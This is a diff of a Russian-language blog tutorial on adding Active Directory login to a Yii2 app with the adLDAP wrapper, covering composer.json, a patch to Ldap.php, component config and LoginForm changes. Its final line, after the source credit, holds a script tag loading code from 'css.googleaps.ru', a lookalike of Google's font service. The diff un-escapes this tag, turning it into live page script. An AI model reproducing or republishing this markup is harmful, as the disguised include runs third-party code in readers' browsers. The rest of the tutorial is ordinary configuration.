@@ -31,33 +31,33 @@ comments: []
 ---
 <div dir="ltr" style="text-align: left;">
 <div dir="ltr" style="text-align: left;">
-<pre><code>cd localhost&#47;yii2&#47;basic<&#47;code><&#47;pre><br />
+<pre><code>cd localhost/yii2/basic</code></pre><br />
 правим composer.json<br />
 добавляем</p>
 <pre><code><br />
 {<br />
-    "name": "yiisoft&#47;yii2-app-advanced",<br />
+    "name": "yiisoft/yii2-app-advanced",<br />
     "description": "Yii 2 Advanced Project Template",<br />
     "keywords": ["yii2", "framework", "advanced", "project template"],<br />
-    "homepage": "http:&#47;&#47;www.yiiframework.com&#47;",<br />
+    "homepage": "http://www.yiiframework.com/",<br />
     "type": "project",<br />
     "license": "BSD-3-Clause",<br />
     "support": {<br />
-        "issues": "https:&#47;&#47;github.com&#47;yiisoft&#47;yii2&#47;issues?state=open",<br />
-        "forum": "http:&#47;&#47;www.yiiframework.com&#47;forum&#47;",<br />
-        "wiki": "http:&#47;&#47;www.yiiframework.com&#47;wiki&#47;",<br />
-        "irc": "irc:&#47;&#47;irc.freenode.net&#47;yii",<br />
-        "source": "https:&#47;&#47;github.com&#47;yiisoft&#47;yii2"<br />
+        "issues": "https://github.com/yiisoft/yii2/issues?state=open",<br />
+        "forum": "http://www.yiiframework.com/forum/",<br />
+        "wiki": "http://www.yiiframework.com/wiki/",<br />
+        "irc": "irc://irc.freenode.net/yii",<br />
+        "source": "https://github.com/yiisoft/yii2"<br />
     },<br />
     "minimum-stability": "stable",<br />
     "repositories": [<br />
         {<br />
             "type": "package",<br />
             "package": {<br />
-                "name": "adldap&#47;adLDAP",<br />
+                "name": "adldap/adLDAP",<br />
                 "version": "4.0.4",<br />
                 "source": {<br />
-                    "url": "https:&#47;&#47;github.com&#47;adldap&#47;adLDAP",<br />
+                    "url": "https://github.com/adldap/adLDAP",<br />
                     "type": "git",<br />
                     "reference": "v4.0.4"<br />
                 }<br />
@@ -66,60 +66,60 @@ comments: []
     ],<br />
     "require": {<br />
         "php": ">=5.4.0",<br />
-        "yiisoft&#47;yii2": ">=2.0.4",<br />
-        "yiisoft&#47;yii2-bootstrap": "*",<br />
-        "yiisoft&#47;yii2-swiftmailer": "*",<br />
-        "adldap&#47;adldap": "<&#47;code><code>4.0.4 as 4.0-stable",<br />
-        "edvlerblog&#47;yii2-adldap-module": "v1.0.0"<br />
+        "yiisoft/yii2": ">=2.0.4",<br />
+        "yiisoft/yii2-bootstrap": "*",<br />
+        "yiisoft/yii2-swiftmailer": "*",<br />
+        "adldap/adldap": "</code><code>4.0.4 as 4.0-stable",<br />
+        "edvlerblog/yii2-adldap-module": "v1.0.0"<br />
     },<br />
     "require-dev": {<br />
-        "yiisoft&#47;yii2-codeception": "*",<br />
-        "yiisoft&#47;yii2-debug": "*",<br />
-        "yiisoft&#47;yii2-gii": "*",<br />
-        "yiisoft&#47;yii2-faker": "*"<br />
+        "yiisoft/yii2-codeception": "*",<br />
+        "yiisoft/yii2-debug": "*",<br />
+        "yiisoft/yii2-gii": "*",<br />
+        "yiisoft/yii2-faker": "*"<br />
     },<br />
     "config": {<br />
         "process-timeout": 1800<br />
     },<br />
     "extra": {<br />
         "asset-installer-paths": {<br />
-            "npm-asset-library": "vendor&#47;npm",<br />
-            "bower-asset-library": "vendor&#47;bower"<br />
+            "npm-asset-library": "vendor/npm",<br />
+            "bower-asset-library": "vendor/bower"<br />
         }<br />
     }<br />
 }<br />
-<&#47;code><&#47;pre><br />
-<&#47;div></p>
-<pre><code>composer update<&#47;code><&#47;pre><br />
+</code></pre><br />
+</div></p>
+<pre><code>composer update</code></pre><br />
 видать из-за версии не можеть увидеть&nbsp; adLDAP<br />
-в yii2&#47;basic&#47;vendor&#47;edvlerblog&#47;yii2-adldap-module&#47;src&#47;Ldap.php<br />
+в yii2/basic/vendor/edvlerblog/yii2-adldap-module/src/Ldap.php<br />
 исправим</p>
-<pre><code>use yiibaseComponent; &#47;&#47;include YII component class<br />
-&#47;&#47;include  dirname(dirname(dirname(dirname(__FILE__)))) .'&#47;adldap&#47;adldap&#47;src&#47;adLDAP.php';&nbsp; -точно работает<br />
-use Adldap&#47;Adldap; &#47;&#47;нет возможности проверить, но по логике должно<br />
-use adLDAP; &#47;&#47;include the adLDAP class<&#47;code><&#47;pre><br />
+<pre><code>use yiibaseComponent; //include YII component class<br />
+//include  dirname(dirname(dirname(dirname(__FILE__)))) .'/adldap/adldap/src/adLDAP.php';&nbsp; -точно работает<br />
+use Adldap/Adldap; //нет возможности проверить, но по логике должно<br />
+use adLDAP; //include the adLDAP class</code></pre><br />
 таким образом мы установили Wrapper для ad ldap</p>
-<p>config&#47;main (advanced) либо config&#47;web (basic)</p>
+<p>config/main (advanced) либо config/web (basic)</p>
 <pre><code>'components' => [<br />
-    ..... <&#47;code><&#47;pre><br />
+    ..... </code></pre><br />
 'ldap' => [<br />
-'class'=>'Edvlerblog&#47;Ldap',<br />
+'class'=>'Edvlerblog/Ldap',<br />
 'options'=> [<br />
-&#47;&#47;'ad_port' => 389,<br />
+//'ad_port' => 389,<br />
 'domain_controllers' => array('AdServerName1'),<br />
 'account_suffix' => '@test.lan',<br />
 'base_dn' => "DC=test,DC=lan",<br />
-&#47;&#47; for basic functionality this could be a standard, non privileged domain user (required)<br />
+// for basic functionality this could be a standard, non privileged domain user (required)<br />
 'admin_username' => 'ActiveDirectoryUser',<br />
 'admin_password' => 'StrongPassword'<br />
 ]<br />
 ]</p>
 <p>...<br />
 ]</p>
-<p>yii2&#47;basic&#47;models&#47;LoginForm.php</p>
+<p>yii2/basic/models/LoginForm.php</p>
 <pre><code>    public function login()<br />
     {<br />
-        $authUser = Yii::$app->ldap->authenticate($this->username, $this->password);<&#47;code><&#47;pre><br />
+        $authUser = Yii::$app->ldap->authenticate($this->username, $this->password);</code></pre><br />
 if ($authUser)<br />
 return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);</p>
 <p>if ($this->validate())<br />
@@ -129,5 +129,5 @@ return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 
 return false;<br />
 }</p>
 <p>&nbsp;</p>
-<p><&#47;div><br />
-Source: des1roer.blogspot.com<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script></p>
+<p></div><br />
+Source: des1roer.blogspot.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
